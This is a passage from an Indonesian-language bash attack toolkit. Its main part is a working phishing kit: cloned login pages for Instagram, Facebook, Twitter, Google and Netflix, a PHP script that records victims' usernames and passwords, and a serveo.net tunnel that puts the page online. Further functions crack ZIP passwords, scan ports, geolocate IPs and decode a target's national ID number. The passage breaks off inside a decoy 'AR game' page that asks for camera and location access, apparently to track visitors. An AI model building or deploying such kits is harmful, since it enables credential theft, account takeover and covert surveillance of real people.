<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/175px-Instagram_logo.svg.png" alt="Instagram">
<form action="login.php" method="POST">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<p style="margin-top:20px"><a href="#">Forgot password?</a></p></div>
<div class="footer">Instagram from Meta</div></div></body></html>
EOF
            ;;
        facebook)
            cat > index.html <<'EOF'
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Facebook – log in or sign up</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;padding:0;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}.wrapper{max-width:400px;margin:80px auto;padding:0 20px}.logo{width:240px;margin-bottom:20px}.box{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,.1)}input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}</style></head><body>
<center><img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"></center>
<div class="wrapper"><div class="box">
<form action="login.php" method="POST">
<input type="text" name="username" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></div></body></html>
EOF
            ;;
        twitter)
            cat > index.html <<'EOF'
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Twitter</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;font-family:Arial;background:#fff;display:flex;align-items:center;justify-content:center;height:100vh}.box{width:400px;padding:40px}.logo{width:40px;margin-bottom:20px}h2{font-size:23px;margin-bottom:30px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:16px}button{width:100%;padding:12px;background:#1da1f2;color:#fff;border:none;border-radius:25px;font-size:15px;font-weight:bold;cursor:pointer}</style></head><body>
<div class="box">
<center><img class="logo" src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png"></center>
<h2>Log in to Twitter</h2>
<form action="login.php" method="POST">
<input type="text" name="username" placeholder="Phone, email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form></div></body></html>
EOF
            ;;
        google)
            cat > index.html <<'EOF'
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Gmail: Email from Google</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;font-family:'Google Sans',Arial;background:#fff}.wrapper{max-width:450px;margin:80px auto;padding:0 20px}.logo{width:120px;margin-bottom:25px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}</style></head><body>
<center><img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"></center>
<div class="wrapper">
<form action="login.php" method="POST">
<input type="email" name="username" placeholder="Enter your email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
EOF
            ;;
        netflix)
            cat > index.html <<'EOF'
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;font-family:Helvetica,Arial;background:#000;color:#fff}.wrapper{max-width:450px;margin:80px auto;padding:0 20px}.logo{width:170px;margin-bottom:30px}input{width:100%;padding:15px;margin:10px 0;border:none;border-radius:4px;font-size:16px}button{width:100%;padding:15px;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}</style></head><body>
<center><img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg"></center>
<div class="wrapper">
<form action="login.php" method="POST">
<input type="text" name="username" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>
EOF
            ;;
        *)  # default untuk yang belum ada template
            [[ ! -f index.html && ! -f index.php ]] && {
                cat > index.html <<'EOF'
<!DOCTYPE html>
<html><head><title>Login</title></head><body bgcolor="#f2f2f2">
<center><h2>Login</h2>
<form method="POST" action="login.php">
<label>Username:</label><br><input name="username"><br>
<label>Password:</label><br><input type="password" name="password"><br><br>
<input type="submit" value="Login">
</form></center></body></html>
EOF
            }
            ;;
    esac

    # ---------- login.php universal ----------
    cat > login.php <<'PHP'
<?php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
if ($user && $pass) {
    file_put_contents('php://stderr', "\n[+] CREDENTIAL BARU =========================\nUsername: $user\nPassword: $pass\n==========================================\n");
    file_put_contents('usernames.txt', "$user:$pass\n", FILE_APPEND | LOCK_EX);
}
$host = basename(dirname(__FILE__));
$real = ['instagram'=>'instagram.com','facebook'=>'facebook.com','twitter'=>'twitter.com','google'=>'accounts.google.com','netflix'=>'netflix.com'];
header('Location: https://'.($real[$host]??'google.com'));
exit;
PHP

    # ---------- log & tunnel ----------
    SERVEO_LOG="$LOG_DIR/serveo.log"
    rm -f "$SERVEO_LOG"

    echo -e "${YELLOW}[+] Starting PHP server...${RESET}"
    php -S 127.0.0.1:$port > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2

    echo -e "${YELLOW}[+] Starting serveo tunnel...${RESET}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
        -R 80:127.0.0.1:$port serveo.net 2>&1 | tee "$SERVEO_LOG" &
    SSH_PID=$!

    timeout=20
    until grep -qE 'https://.*serveo.net' "$SERVEO_LOG" 2>/dev/null || (( timeout <= 0 )); do
        sleep 1
        ((timeout--))
    done

    LINK="$(grep -Eo 'https://[^ ]*serveo.net' "$SERVEO_LOG" 2>/dev/null | head -n1)"
    [[ -z "$LINK" ]] && {
        echo -e "${RED}Gagal mendapatkan link!${RESET}"
        kill "$PHP_PID" "$SSH_PID" 2>/dev/null
        return 1
    }

    echo -e "\n${GREEN}✓ Link phishing aktif:${RESET} ${CYAN}${LINK}${RESET}\n"

    # ---------- monitor ----------
    trap 'echo -e "\n${YELLOW}Berhenti...${RESET}"; kill $PHP_PID $SSH_PID 2>/dev/null; exit 0' INT
    echo -e "${YELLOW}[+] Menunggu korban... (Ctrl+C untuk berhenti)${RESET}"
    while true; do
        [[ -f "ip.txt" ]] && {
            echo -e "${GREEN}[+] IP ditemukan:${RESET} $(cat ip.txt)"
            mv "ip.txt" "$LOG_DIR/ip_$(date +%s).txt"
        }
        [[ -f "usernames.txt" ]] && {
            echo -e "${GREEN}[+] Credential ditemukan:${RESET} $(tail -n1 usernames.txt)"
            mv "usernames.txt" "$LOG_DIR/creds_$(date +%s).txt"
        }
        sleep 2
    done
}

bruteforce_zip() {
  read -p "Masukkan file ZIP: " zipfile
  read -p "Masukkan wordlist: " wordlist
  fcrackzip -u -D -p "$wordlist" "$zipfile"
  read -p "Tekan Enter untuk kembali..."
}

exif_tool() {
  read -p "Masukkan file foto: " foto
  exiftool "$foto" | grep -i "GPS\|Date\|Model"
  read -p "Tekan Enter untuk kembali..."
}

port_scan() {
  read -p "Masukkan IP/host: " target
  nmap -p- --min-rate=1000 "$target"
  read -p "Tekan Enter untuk kembali..."
}

whois_lookup() {
  read -p "Masukkan domain: " domain
  whois "$domain"
  read -p "Tekan Enter untuk kembali..."
}

#####
GeoIP_ISP() {
echo -e "
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣄⣤⣤⣦⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡗⠉⢹⣯⣿⡽⣷⣟⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠊⠁⠀⠀⠀⠑⠢⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡖⡔⣆⢖⢔⢆⢖⢔⢆⢖⢔⢆⢖⢔⢆⢖⢔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠹⠿⠾⠽⠷⣻⣽⢿⡾⣷⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠤⡀⠀⠀⠀⠀⠀⠀⡳⡹⡸⡜⣕⢝⡜⣕⢇⢇⢇⢇⢇⢇⢇⢏⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀ ⣔⣶⣶⣾⢶⣶⣶⣶⡷⣾⣽⣟⣿⣽⡇⢐⢐⠐⠠⠀⠀⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣮⠂⠀⠀⠀⠀⠀⡪⣣⢳⠁⢀⠁⠈⠀⠁⠀⠁⠀⠁⠈⡎⡎⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡾⣟⣯⣷⢿⣻⣽⡷⣟⣿⣽⡾⣯⣷⣟⡇⢀⠢⠨⢈⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⡽⣞⣷⣻⠄⠀⠀⠀⠀⠀⢸⢜⢎⡂⠀⢢⡣⣣⢣⡒⡲⡰⡒⡜⡜⣜⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⡿⣯⣿⣻⡿⠝⠛⠛⠝⠚⠛⠫⠓⠋⡀⡂⠌⠌⡐⠄⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⣲⢯⢿⡽⣽⣻⣞⣾⠁⠀⠀⠀⠀⠀⢸⢸⡱⠅⡀⢈⠨⠈⠈⠈⠈⠈⠈⢘⢜⢜⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣟⣿⢾⡻⠀⠄⠅⠅⡊⠌⠌⠌⡐⡁⡂⠔⠡⠨⠠⢑⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⡷⡯⠏⡫⣟⣷⣳⣟⣾⠁⠀⠀⠀⠀⠀⠨⡪⡎⡧⡰⡠⡢⡤⠥⠤⢤⠀⠀⢸⢸⢱⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠺⣯⢿⣻⡇⠈⢌⢐⢁⠂⠅⡊⡐⡐⡐⠠⠡⠡⠡⢁⠂⠀⠀ ⡇⠀⠀⠀⠀⠀⠀⠀⠀⡿⣭⢘⠹⣻⣞⣗⡷⣯⠃⠀⠀⠀⠀⠀⠀⡏⡮⣒⠀⢀⠳⢭⠭⡹⡨⠀⠀⢕⢕⡳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⠉⠃⢈⠐⠄⡂⠅⡁⡀⠠⢀⢀⠁⠁⠁⠈⠀⠀⠀⠀⠀⠘⠤⡀⠀⠀⠀⠀⠀⠀⡿⣝⠙⣼⣝⡮⣞⡯⠏⠀⠀⠀⠀⠀⠀⠀⡣⡳⡱⣀⠠⠀⡀⠁⠀⠀⢀⢀⢇⢇⢗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⢁⠅⡂⠅⡂⠌⠌⠀⠂⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠢⣀⠀⠀⠀⡿⣽⣻⣺⠳⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢕⢝⢎⢮⢝⢕⢖⢕⢜⢜⢜⢜⢜⡜⡕⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⢂⠂⠅⡂⠅⡂⡂⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠄⡯⠗⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠋⠪⠪⢣⢳⡱⡕⡕⠇⠏⠊⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣦⣴⣤⣄⠀⢤⣦⣴⣄⠀⢴⣴⣤⢰⣴⡤⣰⣴⣤⣦⣦⡦⣴⣤⣦⣴⣤⠀⢠⣦⣴⣤⣦⢀⣠⣦⣦⣄⠀⢀⣤⣦⣦⣀⢠⣦⣦⡄⠀⣠⣦⣦⡄⠀⢠⣦⣴⡄⣦⣦⠀⣀⣀⠀⠀⠀⢀⣀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢈⣿⡧⢹⣿⡇⢰⣟⣿⣿⠀⢨⣿⣿⣧⣿⠅⠀⢻⣿⣾⡋⠀⠙⣿⣷⠟⠀⠀⠘⠫⣿⣏⠛⢸⣿⡇⢸⣿⣇⣿⣿⠀⣿⣿⠀⣿⣿⢀⡀⢿⣷⣿⣅⠀⠀⢹⣿⡅⣿⠃⢺⣿⣽⡇⠀⠀⠸⣫⣿⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⣷⣾⠿⠣⣾⣯⢽⣿⣧⢴⣿⡜⣿⣿⠅⣶⣿⡭⣿⣷⡆⠀⣾⣿⣇⠀⠀⠀⣸⣿⣷⡀⠘⢿⣧⣾⠿⠃⠻⣿⣦⡿⠟⢰⣿⣿⣾⣇⣷⣯⣿⠟⠀⠀⠀⣿⣿⡏⠀⢿⣯⣿⠷⣰⣶⢰⣤⣽⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
read -p "Masukkan IP / domain untuk di-track: " target
echo -e "\n[+] Tracking $target ..."
data=$(curl -s "http://ip-api.com/json/$target?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query")
status=$(echo "$data" | grep -o '"status":"[^"]*' | cut -d'"' -f4)

if [[ "$status" == "success" ]]; then
    echo -e "\n=== INFO IP TRACKER ==="
    echo -e "IP        : $(echo "$data" | grep -o '"query":"[^"]*' | cut -d'"' -f4)"
    echo -e "Negara    : $(echo "$data" | grep -o '"country":"[^"]*' | cut -d'"' -f4)"
    echo -e "Provinsi  : $(echo "$data" | grep -o '"regionName":"[^"]*' | cut -d'"' -f4)"
    echo -e "Kota      : $(echo "$data" | grep -o '"city":"[^"]*' | cut -d'"' -f4)"
    echo -e "Kode Pos  : $(echo "$data" | grep -o '"zip":"[^"]*' | cut -d'"' -f4)"
    echo -e "Latitude  : $(echo "$data" | grep -o '"lat":[^,]*' | cut -d':' -f2)"
    echo -e "Longitude : $(echo "$data" | grep -o '"lon":[^,]*' | cut -d':' -f2)"
    echo -e "ISP       : $(echo "$data" | grep -o '"isp":"[^"]*' | cut -d'"' -f4)"
    echo -e "Organisasi: $(echo "$data" | grep -o '"org":"[^"]*' | cut -d'"' -f4)"
    echo -e "AS        : $(echo "$data" | grep -o '"as":"[^"]*' | cut -d'"' -f4)"
else
    echo -e "[-] Gagal mendapatkan data: $(echo "$data" | grep -o '"message":"[^"]*' | cut -d'"' -f4)"
fi
}

Nik_cek() {
    clear
    echo -e "${RED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}" | lolcat
    echo -e "${BG_RED}${YELLOW}CHECKER INFORMASI NIK${NC}"

    # Input NIK
    read -p "$(echo -e ${RED}Input\ NIK\ Target:\ ${NC})" nik
    if ! [[ $nik =~ ^[0-9]{16}$ ]]; then
        echo -e "${RED}ERROR! NIK Tidak Valid!${NC}"
        exit 1
    fi

    # --- loading (disingkat) ---
    (sleep 2) & spin $! && wait

    # --- parsing NIK (logika Anda) ---
    tanggal="${nik:6:2}"
    bulan="${nik:8:2}"
    tahun="${nik:10:2}"
    prov="${nik:0:2}"
    kabkot="${nik:0:4}"
    kecamatan="${nik:0:6}"
    uniqcode="${nik:12:4}"

    if ((10#$tanggal > 40)); then
        tanggal=$((10#$tanggal - 40))
        jeniskelamin="PEREMPUAN"
    else
        jeniskelamin="LAKI-LAKI"
    fi

    # Ambil data lokasi (asumsi data.json ada)
    if [[ ! -f "data.json" ]]; then
        echo -e "${RED}! Data Tidak Valid !${NC}"
        exit 1
    fi
    provinsi=$(jq -r --arg p "$prov" '.provinsi[$p] // $p' data.json)
    kabupaten=$(jq -r --arg k "$kabkot" '.kabkot[$k] // $k' data.json)
    kecamatan_data=$(jq -r --arg kc "$kecamatan" '.kecamatan[$kc] // $kc' data.json)
    IFS='--' read -r kecamatan_name kode_pos <<< "$kecamatan_data"

    # --- download mock foto ---
    mkdir -p hasil
    foto_file="hasil/foto_${nik}.jpg"
    curl -s "https://thispersondoesnotexist.com/image" \
         -H "User-Agent: Mozilla/5.0" \
         --output "$foto_file"
    if [[ $? -ne 0 || ! -s "$foto_file" ]]; then
        echo -e "${RED}Gagal unduh foto mock-up${NC}"
        foto_file=""
    fi

    # --- tampilkan hasil ---
    echo -e "${GREEN}!Tanggal Lahir: $tanggal/$bulan/$tahun${NC}"
    echo -e "${GREEN}!Jenis Kelamin: $jeniskelamin${NC}"
    echo -e "${GREEN}!Provinsi: $provinsi${NC}"
    echo -e "${GREEN}!Kab/Kota: $kabupaten${NC}"
    echo -e "${GREEN}!Kecamatan: $kecamatan_name${NC}"
    echo -e "${GREEN}!Kode Pos: $kode_pos${NC}"
    echo -e "${GREEN}!Uniqcode: $uniqcode${NC}"

    if [[ -n "$foto_file" ]]; then
        echo -e "${GREEN}!Foto mock-up disimpan di: $foto_file${NC}"
        # opsional tampilkan di terminal (iTerm2)
        command -v imgcat >/dev/null && imgcat "$foto_file"
        # atau buka di viewer default:
        # xdg-open "$foto_file" 2>/dev/null || open "$foto_file"
    fi
}


track_live() {
mkdir -p DanxyTracker
cd DanxyTracker

# === HTML AR GAME TRANSPARAN ===
cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>AR Quest: Neon Explorer</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
    *{box-sizing:border-box}
    body{margin:0;font-family:'Orbitron',monospace;background:#0b0e1a;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
    .screen{width:100%;max-width:400px;text-align:center;padding:30px}
    h1{color:#00f5ff;text-shadow:0 0 10px #00f5ff;font-size:24px;margin-bottom:10px}
    p{font-size:14px;color:#8fbcff;margin-bottom:25px;line-height:1.4}
    .btn{background:#00f5ff;color:#0b0e1a;border:none;padding:15px 40px;border-radius:30px;font-size:16px;cursor:pointer;transition:.3s}
    .btn:hover{transform:scale(1.05);box-shadow:0 0 15px #00f5ff}
    .avatar{width:120px;height:120px;border:2px solid #00f5ff;border-radius:50%;margin:0 auto 20px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="35" r="20" fill="%2300f5ff"/><rect x="30" y="60" width="40" height="30" fill="%2300f5ff"/></svg>') center/cover}
    .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:#0b0e1ae6;display:none;align-items:center;justify-content:center;z-index:10}
    .popup .card{background:#111;border:2px solid #00f5ff;border-radius:15px;padding:25px;width:300px;text-align:center}
    .popup h2{color:#00f5ff;margin-top:0}
    .popup p{font-size:13px;color:#8fbcff;margin-bottom:20px}
    #featureList {
      list-style: none;
      padding: 0;
      margin-bottom: 20px;
    }
    #featureList li {
      margin-bottom: 8px;
      display: flex;
      align-items: center;
    }
    #featureList li::before {
      content: "✓"; /* Checkmark */
      color: #00f5ff;
      margin-right: 8px;
    }
    .hidden {
      display: none !important;
    }
    #permissionDetails {
      font-size: 12px;
      color: #666;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <!-- Screen 1: Welcome -->
  <div class="screen" id="welcome">
    <div class="avatar"></div>
    <h1>AR Quest: Neon Explorer</h1>
    <p>Selamat datang di dunia AR yang penuh petualangan! Bersiaplah untuk menjelajahi lingkungan sekitar Anda dengan cara yang baru dan menarik, klik tombol di bawah untuk melanjutkan</p>
    <button class="btn" onclick="showConsent()">Mulai Petualangan</button>
  </div>

  <!-- Screen 2: Consent -->
  <div class="popup" id="consentPopup">
    <div class="card">
      <h2>Aktifkan Fitur Tambahan</h2>
      <p>Untuk pengalaman yang lebih imersif, aktifkan fitur-fitur berikut:</p>
      <ul id="featureList">
        <li>Personalisasi Avatar (akses kamera) untuk membuat avatar anda</li>
        <li>Eksplorasi Lokasi (akses lokasi) untuk mendapatkan tempat karakter yang anda inginkan</li>
